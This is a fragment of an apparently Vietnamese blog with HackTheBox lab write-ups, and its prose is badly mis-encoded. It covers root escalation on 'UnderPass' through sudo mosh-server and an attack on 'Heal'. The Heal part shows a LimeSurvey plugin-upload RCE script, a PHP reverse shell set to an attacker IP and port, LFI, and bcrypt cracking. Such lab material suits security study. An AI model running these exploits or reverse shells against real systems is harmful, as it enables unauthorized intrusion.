9l 28w 319c http://underpass.htb/daloradius =\u0026gt; http://underpass.htb/daloradius/ 301 GET 9l 28w 323c http://underpass.htb/daloradius/doc =\u0026gt; http://underpass.htb/daloradius/doc/ 301 GET 9l 28w 325c http://underpass.htb/daloradius/setup =\u0026gt; http://underpass.htb/daloradius/setup/ 301 GET 9l 28w 323c http://underpass.htb/daloradius/app =\u0026gt; http://underpass.htb/daloradius/app/ 301 GET 9l 28w 327c http://underpass.htb/daloradius/library =\u0026gt; http://underpass.htb/daloradius/library/ 301 GET 9l 28w 330c http://underpass.htb/daloradius/app/common =\u0026gt; http://underpass.htb/daloradius/app/common/ 301 GET 9l 28w 329c http://underpass.htb/daloradius/app/users =\u0026gt; http://underpass.htb/daloradius/app/users/ 301 GET 9l 28w 337c http://underpass.htb/daloradius/app/users/include =\u0026gt; http://underpass.htb/daloradius/app/users/include/ 301 GET 9l 28w 344c http://underpass.htb/daloradius/app/users/include/config =\u0026gt; http://underpass.htb/daloradius/app/users/include/config/ 301 GET 9l 28w 336c http://underpass.htb/daloradius/app/users/static =\u0026gt; http://underpass.htb/daloradius/app/users/static/ 301 GET 9l 28w 344c http://underpass.htb/daloradius/app/users/include/common =\u0026gt; http://underpass.htb/daloradius/app/users/include/common/ 301 GET 9l 28w 334c http://underpass.htb/daloradius/app/users/lang =\u0026gt; http://underpass.htb/daloradius/app/users/lang/ 301 GET 9l 28w 327c http://underpass.htb/daloradius/contrib =\u0026gt; http://underpass.htb/daloradius/contrib/ 301 GET 9l 28w 337c http://underpass.htb/daloradius/app/users/library =\u0026gt; http://underpass.htb/daloradius/app/users/library/ 301 GET 9l 28w 335c http://underpass.htb/daloradius/contrib/scripts =\u0026gt; http://underpass.htb/daloradius/contrib/scripts/ 301 GET 9l 28w 330c http://underpass.htb/daloradius/contrib/db =\u0026gt; http://underpass.htb/daloradius/contrib/db/ 301 GET 9l 28w 342c http://underpass.htb/daloradius/app/users/include/menu =\u0026gt; http://underpass.htb/daloradius/app/users/include/menu/ 301 GET 9l 28w 343c http://underpass.htb/daloradius/app/users/static/images =\u0026gt; http://underpass.htb/daloradius/app/users/static/images/ 301 GET 9l 28w 339c http://underpass.htb/daloradius/app/users/static/js =\u0026gt; http://underpass.htb/daloradius/app/users/static/js/ 301 GET 9l 28w 348c http://underpass.htb/daloradius/app/users/library/javascript =\u0026gt; http://underpass.htb/daloradius/app/users/library/javascript/ 301 GET 9l 28w 331c http://underpass.htb/daloradius/doc/install =\u0026gt; http://underpass.htb/daloradius/doc/install/ 301 GET 9l 28w 338c http://underpass.htb/daloradius/app/common/library =\u0026gt; http://underpass.htb/daloradius/app/common/library/ 301 GET 9l 28w 347c http://underpass.htb/daloradius/contrib/scripts/maintenance =\u0026gt; http://underpass.htb/daloradius/contrib/scripts/maintenance/ 301 GET 9l 28w 348c http://underpass.htb/daloradius/app/common/library/phpmailer =\u0026gt; http://underpass.htb/daloradius/app/common/library/phpmailer/ 301 GET 9l 28w 343c http://underpass.htb/daloradius/app/users/notifications =\u0026gt; http://underpass.htb/daloradius/app/users/notifications/ 200 GET 247l 1010w 7814c http://underpass.htb/daloradius/doc/install/INSTALL 301 GET 9l 28w 344c http://underpass.htb/daloradius/app/users/library/graphs =\u0026gt; http://underpass.htb/daloradius/app/users/library/graphs/ Vá» cÆ¡ báº£n thÃ¬ mÃ£ nguá»“n Ä‘Æ°á»£c chá»©a trong thÆ° má»¥c /daloradius/\nSau khi ngá»¥p láº·n trong mÃ£ nguá»“n thÃ¬ tÃ´i nháº­n tháº¥y cÃ¡c config cÅ©ng nhÆ° cÃ¡c pháº§n quáº£n lÃ½ náº±m trong /operators/\nVáº«n lÃ  trong mÃ£ nguá»“n vÃ  cáº£ trong cÃ¡c Issues, tÃ´i tÃ¬m tháº¥y thÃ´ng tin Ä‘Äƒng nháº­p máº·c Ä‘á»‹nh administrator:radius vÃ  thá»­ Ä‘Äƒng nháº­p vÃ o nÃ³\nBoom\u0026hellip;\nSSH and User flag # Kiá»ƒm tra users list, tÃ´i cÃ³ 1 user vÃ  password\nCopy password nÃ y vÃ o Crackstation vÃ  tÃ´i nháº­n Ä‘Æ°á»£c pass cá»§a user svcMosh\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb-overpass] â””â”€$ ssh svcMosh@10.10.11.48 svcMosh@10.10.11.48\u0026#39;s password: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon Feb 10 09:07:51 AM UTC 2025 System load: 0.19 Processes: 253 Usage of /: 71.6% of 6.56GB Users logged in: 1 Memory usage: 31% IPv4 address for eth0: 10.10.11.48 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Feb 10 06:36:04 2025 from 10.10.16.25 svcMosh@underpass:~$ ls traitor-amd64 user.txt Privilege escalation # sudo -l\nsvcMosh@underpass:~$ sudo -l Matching Defaults entries for svcMosh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svcMosh may run the following commands on localhost: (ALL) NOPASSWD: /usr/bin/mosh-server crontab\nsvcMosh@underpass:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh # You can also override PATH, but by default, newer versions inherit it from the environment #PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # #* * * * * root mosh --local 127.0.0.1 Vá»›i sudo -l tÃ´i cÃ³ thá»ƒ cháº¡y mosh-server vá»›i quyá»n root. crontab truy cáº­p localhost thÃ´ng qua mosh. Mosh cÅ©ng tÆ°Æ¡ng tá»± nhÆ° SSH cho phÃ©p truy cáº­p vÃ o server thÃ´ng qua username vÃ  password\nTÃ´i tÃ¬m tháº¥y cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i Mosh á»Ÿ Ä‘Ã¢y\nÄáº§u tiÃªn táº¡o má»™t mosh-server má»›i vá»›i port Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh\nsvcMosh@underpass:~$ sudo /usr/bin/mosh-server new -i 127.0.0.1 -p 60010 MOSH CONNECT 60010 I7hqnaOsdBVY3Yc8BJfpGg mosh-server (mosh 1.3.2) [build mosh 1.3.2] Copyright 2012 Keith Winstein \u0026lt;mosh-devel@mit.edu\u0026gt; License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. [mosh-server detached, pid = 200308] svcMosh@underpass:~$ Truy cáº­p mosh-server Ä‘á»ƒ láº¥y root vá»›i MOSH_KEY chÃ­nh lÃ  Ä‘oáº¡n key vá»«a táº¡o á»Ÿ bÆ°á»›c trÃªn.\nsvcMosh@underpass:~$ MOSH_KEY=h+BFdQKt6sFjrGb/Zd1DfQ mosh-client 127.0.0.1 60010 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon Feb 10 04:44:32 PM UTC 2025 System load: 0.0 Processes: 253 Usage of /: 73.9% of 6.56GB Users logged in: 2 Memory usage: 31% IPv4 address for eth0: 10.10.11.48 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Mosh: You have 2 detached Mosh sessions on this server, with PIDs: - mosh [130995] - mosh [192326] root@underpass:~# id uid=0(root) gid=0(root) groups=0(root) root@underpass:~# ll total 44 drwx------ 6 root root 4096 Feb 8 10:10 ./ drwxr-xr-x 18 root root 4096 Dec 11 16:06 ../ lrwxrwxrwx 1 root root 9 Nov 30 10:39 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrc drwx------ 2 root root 4096 Sep 22 01:27 .cache/ drwx------ 3 root root 4096 Dec 11 13:40 .config/ -rw------- 1 root root 20 Dec 19 12:42 .lesshst drwxr-xr-x 3 root root 4096 Dec 11 16:06 .local/ -rw-r--r-- 1 root root 161 Jul 9 2019 .profile -rw-r----- 1 root root 33 Feb 8 10:10 root.txt drwx------ 2 root root 4096 Dec 11 16:06 .ssh/ -rw-r--r-- 1 root root 165 Dec 11 16:38 .wget-hsts root@underpass:~# ","date":"1 February 2025","externalUrl":null,"permalink":"/ctf/hackthebox/underpass/","section":"Ctf","summary":"","title":"Hackthebox - UnderPass","type":"ctf"},{"content":"","date":"1 February 2025","externalUrl":null,"permalink":"/tags/mosh/","section":"Tags","summary":"","title":"Mosh","type":"tags"},{"content":"","date":"1 February 2025","externalUrl":null,"permalink":"/tags/snmp/","section":"Tags","summary":"","title":"Snmp","type":"tags"},{"content":"","date":"7 January 2025","externalUrl":null,"permalink":"/tags/consul/","section":"Tags","summary":"","title":"Consul","type":"tags"},{"content":" Reconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o= | 256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://heal.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain vÃ o file hosts\n10.10.11.46 heal.htb Sá»­ dá»¥ng cÃ¡c cÃ´ng cá»¥ vÃ  cÃ¡c phÆ°Æ¡ng phÃ¡p thÃ´ng thÆ°á»ng\nEnumeration and Gaining access # Vhosts, directories # TÃ¬m directories\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dirsearch -u http://heal.htb /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/reports/http_heal.htb/_25-02-19_11-41-32.txt Target: http://heal.htb/ [11:41:32] Starting: [11:41:35] 503 - 608B - /html.old [11:41:35] 503 - 608B - /jsp.php [11:41:35] 503 - 608B - /php [11:41:35] 503 - 608B - /jsp.tar [11:41:35] 503 - 608B - /html.tar [11:41:36] 503 - 608B - /php.tar [11:41:36] 503 - 608B - /aspx.tgz [11:41:36] 503 - 608B - /jsp.tgz [11:41:36] 503 - 608B - /php.txt [11:41:36] 503 - 608B - /aspx.txt [11:41:36] 503 - 608B - /jsp.txt [11:41:36] 503 - 608B - /php.zip [11:41:36] 503 - 608B - /aspx.zip [11:41:36] 503 - 608B - /jsp.zip [11:41:36] 503 - 608B - /+CSCOE+/session_password.html [11:41:36] 503 - 608B - /%ff CÃ³ váº» nhÆ° khÃ´ng thá»ƒ tÃ¬m Ä‘Æ°á»£c directories báº±ng tool. VÃ¬ cÃ³ domain nÃªn tÃ´i sáº½ Ä‘i tÃ¬m vhost cá»§a nÃ³\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/burpsuite_pro] â””â”€$ ffuf -u http://heal.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \u0026#34;Host: FUZZ.heal.htb\u0026#34; -r /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://heal.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.heal.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ demo [Status: 200, Size: 1672, Words: 330, Lines: 43, Duration: 66ms] mysql [Status: 200, Size: 1672, Words: 330, Lines: 43, Duration: 165ms] www [Status: 200, Size: 1672, Words: 330, Lines: 43, Duration: 261ms] cpanel [Status: 200, Size: 1672, Words: 330, Lines: 43, Duration: 357ms] Sá»­ dá»¥ng ffuf vá»›i má»™t sá»‘ tuá»³ chá»n:\n-H: Header cá»§a request, giá»‘ng nhÆ° request trong burpsuite. Vá»‹ trÃ­ cá»§a tham sá»‘ FUZZ sáº½ quyáº¿t Ä‘á»‹nh nÆ¡i cÃ´ng cá»¥ khai thÃ¡c (á»Ÿ Ä‘Ã¢y lÃ  tÃ¬m vhost) -r: Follow redirect -fs: Filter HTTP response size - KhÃ´ng in ra nhá»¯ng káº¿t quáº£ cÃ³ kÃ­ch thÆ°á»›c cá»§a response lÃ  1672 â”Œâ”€â”€(kaliã‰¿kali)-[~/burpsuite_pro] â””â”€$ ffuf -u http://heal.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H \u0026#34;Host: FUZZ.heal.htb\u0026#34; -r -fs 1672 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://heal.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt :: Header : Host: FUZZ.heal.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 1672 ________________________________________________ [WARN] Caught keyboard interrupt (Ctrl-C) Chá» khÃ¡ lÃ¢u mÃ  khÃ´ng cÃ³ káº¿t quáº£, tÃ´i sáº½ thá»­ thÃªm 1 láº§n ná»¯a nhÆ°ng vá»›i 1 dictionary khÃ¡c\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/burpsuite_pro] â””â”€$ ffuf -u http://heal.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \u0026#34;Host: FUZZ.heal.htb\u0026#34; -r -fs 1672 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://heal.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.heal.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 1672 ________________________________________________ api [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 5198ms] ThÃªm vhost vÃ  file host\n10.10.11.46 heal.htb api.heal.htb Thá»­ tÃ¬m kiáº¿m cÃ¡c thÃ´ng tin vá» lá»— há»•ng cá»§a Rails version 7.1.4 hay ruby 3.3.5 nhÆ°ng khÃ´ng cÃ³ gÃ¬, nÃªn tÃ´i sáº½ quay láº¡i vá»›i trang Ä‘áº§u tiÃªn vÃ¬ tÃ´i chÆ°a lÃ m gÃ¬ vá»›i nÃ³.\nThá»­ Signup Ä‘á»ƒ Ä‘Äƒng kÃ½ tÃ i khoáº£n\nLÆ°á»›t qua cÃ¡c input trÃªn trang web, khi chá»n SURVEY, tÃ´i nháº­n ra cÃ³ 1 url má»›i\nThÃªm vhost vÃ o file host\n10.10.11.46 heal.htb api.heal.htb take-survey.heal.htb Truy cáº­p thá»­ domain, tÃ´i láº¡i cÃ³ thÃªm 1 sá»‘ dá»¯ kiá»‡n\nExploit Limesurvey # TÃ´i cÃ³ 1 opensource tÃªn LimeSurvey, tÃ¬m lá»— há»•ng cá»§a opensource nÃ y, tÃ´i tÃ¬m tháº¥y Limesurvey-RCE\nPhÃ¢n tÃ­ch 1 chÃºt vá» lá»— há»•ng nÃ y. Script sáº½ thá»±c hiá»‡n khai thÃ¡c RCE báº±ng cÃ¡ch Ä‘Äƒng nháº­p vÃ o há»‡ thá»‘ng LimeSurvey, táº£i lÃªn 1 plugin Ä‘á»™c háº¡i, cÃ i Ä‘áº·t vÃ  ká»‹ch hoáº¡t nÃ³ Ä‘á»ƒ má»Ÿ 1 reverse shell.\nCá»¥ thá»ƒ, code sáº½ cá»‘ gáº¯ng Ä‘Äƒng nháº­p vÃ o LimeSurvey Ä‘á»ƒ láº¥y CSRF token.\nSau khi Ä‘Äƒng nháº­p thÃ nh cÃ´ng, truy cáº­p vÃ o trang quáº£n lÃ½ plugin Ä‘á»ƒ láº¥y CSRF token thá»© 2.\nUpload_creds = { \u0026#34;YII_CSRF_TOKEN\u0026#34;: CSRF_token2, \u0026#34;lid\u0026#34;: \u0026#34;$lid\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;templateupload\u0026#34; } file_upload = req.post(url+\u0026#34;/index.php/admin/pluginmanager?sa=upload\u0026#34;, files={\u0026#39;the_file\u0026#39;: filehandle}, data=Upload_creds) Táº¡o payload Ä‘á»ƒ táº£i file lÃªn\nUploadPage = req.get(url+\u0026#34;/index.php/admin/pluginmanager?sa=uploadConfirm\u0026#34;) print(\u0026#34;[+] Plugin Uploaded Successfully\u0026#34;) Láº¥y CSRF token thá»© 3 tá»« trang cÃ i Ä‘áº·t plugin vÃ  gá»­i yÃªu cáº§u POST Ä‘á»ƒ cÃ i Ä‘áº·t plugin vá»«a táº£i lÃªn.\nInstallPage = req.get(url+\u0026#34;/index.php/admin/pluginmanager?sa=installUploadedPlugin\u0026#34;) response = InstallPage.text s = BeautifulSoup(response, \u0026#39;html.parser\u0026#39;) CSRF_token3 = s.findAll(\u0026#39;input\u0026#39;)[0].get(\u0026#34;value\u0026#34;) print(CSRF_token3) Install_creds = { \u0026#34;YII_CSRF_TOKEN\u0026#34;: CSRF_token3, \u0026#34;isUpdate\u0026#34;: \u0026#34;false\u0026#34; } file_install = req.post(url+\u0026#34;/index.php/admin/pluginmanager?sa=installUploadedPlugin\u0026#34;, data=Install_creds) print(\u0026#34;[+] Plugin Installed Successfully\u0026#34;) Láº¥y CSRF thá»© 4 tá»« trang kÃ­ch hoáº¡t plugin vÃ  kÃ­ch hoáº¡t nÃ³ vá»›i pluginId=1.\nActivatePage = req.get(url+\u0026#34;/index.php/admin/pluginmanager?sa=activate\u0026#34;) response = ActivatePage.text s = BeautifulSoup(response, \u0026#39;html.parser\u0026#39;) CSRF_token4 = s.findAll(\u0026#39;input\u0026#39;)[0].get(\u0026#34;value\u0026#34;) print(CSRF_token4) Activate_creds = { \u0026#34;YII_CSRF_TOKEN\u0026#34;: CSRF_token4, \u0026#34;pluginId\u0026#34;: \u0026#34;1\u0026#34; # CHANGE THIS } file_activate = req.post(url+\u0026#34;/index.php/admin/pluginmanager?sa=activate\u0026#34;, data=Activate_creds) print(\u0026#34;[+] Plugin Activated Successfully\u0026#34;) LÆ°u Ã½, cáº§n thay Ä‘á»•i Ä‘Æ°á»ng dáº«n chá»©a file Y1LD1R1M.zip cho Ä‘Ãºng thÃ¬ má»›i cÃ³ thá»ƒ táº£i lÃªn thÃ nh cÃ´ng.\nfilehandle = open(\u0026#34;/root/limesurvey/plugin/Y1LD1R1M.zip\u0026#34;, mode=\u0026#34;rb\u0026#34;) # CHANGE THIS UploadPage = req.get(url+\u0026#34;/index.php/admin/pluginmanager/sa/index\u0026#34;) response = UploadPage.text s = BeautifulSoup(response, \u0026#39;html.parser\u0026#39;) CSRF_token2 = s.findAll(\u0026#39;input\u0026#39;)[0].get(\u0026#34;value\u0026#34;) print(CSRF_token2) Thay Ä‘á»•i Ä‘Æ°á»ng dáº«n file Ä‘áº¿n file zip\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ pwd Y1LD1R1M.zip /home/neo/htb/machines/heal/Limesurvey-RCE â”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ /home/neo/htb/machines/heal/Limesurvey-RCE/Y1LD1R1M.zip filehandle = open(\u0026#34;/home/neo/htb/machines/heal/Limesurvey-RCE/Y1LD1R1M.zip\u0026#34;, mode=\u0026#34;rb\u0026#34;) # CHANGE THIS UploadPage = req.get(url+\u0026#34;/index.php/admin/pluginmanager/sa/index\u0026#34;) response = UploadPage.text s = BeautifulSoup(response, \u0026#39;html.parser\u0026#39;) CSRF_token2 = s.findAll(\u0026#39;input\u0026#39;)[0].get(\u0026#34;value\u0026#34;) print(CSRF_token2) Thay Ä‘á»•i reverse shell thÃ nh IP cá»§a mÃ¡y kali vÃ  port muá»‘n láº¯ng nghe\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ nano php-rev.php set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.10.14.11\u0026#39;; // CHANGE THIS $port = 9001; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; Zip láº¡i file file php-rev.php Ä‘Ã£ sá»­a Ä‘á»•i vÃ  config.xml\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ rm -r Y1LD1R1M.zip â”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ zip Y1LD1R1M.zip config.xml php-rev.php adding: config.xml (deflated 56%) adding: php-rev.php (deflated 61%) Cháº¡y exploit vá»›i port 9001\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ python3 exploit.py http://take-survey.heal.htb admin password 9001 KhÃ´ng cÃ³ káº¿t quáº£. CÃ³ váº» nhÆ° username vÃ  password máº·c Ä‘á»‹nh khÃ´ng cÃ³ káº¿t quáº£. TÃ´i sáº½ quay trá»Ÿ láº¡i heal.htb vÃ¬ cÃ²n 1 sá»‘ pháº§n chÆ°a khai thÃ¡c háº¿t.\nTÃ´i sáº½ thá»­ Ä‘iá»n thÃ´ng tin vÃ  export as pdf.\nBáº­t Burpsuite Ä‘á»ƒ báº¯t request\ná» request OPTIONS tÃ´i cÃ³ path /download?filename=775f1583bfddb57d91dd.pdf tÃ´i nghÄ© ngay Ä‘áº¿n cÃ³ thá»ƒ LFI á»Ÿ Ä‘Ã¢y. Gá»­i request nÃ y vÃ  request GET cÃ³ chá»©a Authorization Ä‘áº¿n Repeater. Sau Ä‘Ã³ thay tháº¿ /resume báº±ng path phÃ­a trÃªn\nÄá»ƒ Ã½ ngoÃ i user ralph Ä‘Ã£ biáº¿t tá»« trÆ°á»›c thÃ¬ tÃ´i cÃ²n cÃ³ thÃªm user ron.\nSau khi search gg cÅ©ng nhÆ° há»i máº¥y con AI vá» nÃ³i lÆ°u trá»¯ thÃ´ng tin Ä‘Äƒng nháº­p, database hay cÃ¡c file config cá»§a ruby on rails thÃ¬ tÃ´i biáº¿t Ä‘Æ°á»£c cÃ¡c thÃ´ng tin nÃ y thÆ°á»ng náº±m á»Ÿ /config/database.yml\nTÃ´i Ä‘Ã£ cÃ³ Ä‘Æ°á»£c hash cá»§a user ralph. Sá»­ dá»¥ng john Ä‘á»ƒ crack nÃ³\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ cat hash $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG â”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal/Limesurvey-RCE] â””â”€$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 4096 for all loaded hashes Will run 20 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 147258369 (?) 1g 0:00:00:05 DONE (2025-03-22 14:52) 0.1960g/s 105.8p/s 105.8c/s 105.8C/s aaliyah..miranda Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. ÄÄƒng nháº­p vÃ o Limesurvey theo Ä‘Æ°á»ng dáº«n trong file exploit.py\nThá»­ upload thá»§ cÃ´ng plugin: Configuration -\u0026gt; Plugins -\u0026gt; Upload \u0026amp; install\nCÃ³ 1 lÆ°u Ã½ mÃ  lÃºc Ä‘áº§u tÃ´i Ä‘Ã£ khÃ´ng nháº­n ra vÃ  khÃ´ng thá»ƒ upload Ä‘Æ°á»£c plugin, Ä‘Ã³ lÃ  phiÃªn báº£n trong config.xml vÃ  phiÃªn báº£n cá»§a Limesurvey khÃ´ng tÆ°Æ¡ng thÃ­ch vá»›i nhau\nTÃ´i pháº£i chá»‰nh sá»­a vÃ  thÃªm version cá»§a phiÃªn báº£n Limesurvey hiá»‡n táº¡i vÃ o config.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;config\u0026gt; \u0026lt;metadata\u0026gt; \u0026lt;name\u0026gt;Y1LD1R1M\u0026lt;/name\u0026gt; \u0026lt;type\u0026gt;plugin\u0026lt;/type\u0026gt; \u0026lt;creationDate\u0026gt;2020-03-20\u0026lt;/creationDate\u0026gt; \u0026lt;lastUpdate\u0026gt;2020-03-31\u0026lt;/lastUpdate\u0026gt; \u0026lt;author\u0026gt;Y1LD1R1M\u0026lt;/author\u0026gt; \u0026lt;authorUrl\u0026gt;https://github.com/Y1LD1R1M-1337\u0026lt;/authorUrl\u0026gt; \u0026lt;supportUrl\u0026gt;https://github.com/Y1LD1R1M-1337\u0026lt;/supportUrl\u0026gt; \u0026lt;version\u0026gt;6.6.4\u0026lt;/version\u0026gt; \u0026lt;license\u0026gt;GNU General Public License version 2 or later\u0026lt;/license\u0026gt; \u0026lt;description\u0026gt; \u0026lt;![CDATA[Author : Y1LD1R1M]]\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;/metadata\u0026gt; \u0026lt;compatibility\u0026gt; \u0026lt;version\u0026gt;3.0\u0026lt;/version\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;version\u0026gt;5.0\u0026lt;/version\u0026gt; \u0026lt;version\u0026gt;6.0\u0026lt;/version\u0026gt; \u0026lt;/compatibility\u0026gt; \u0026lt;updaters disabled=\u0026#34;disabled\u0026#34;\u0026gt;\u0026lt;/updaters\u0026gt; \u0026lt;/config\u0026gt; Sau Ä‘Ã³ thÃ¬ xoÃ¡ file zip cÅ© vÃ  thá»±c 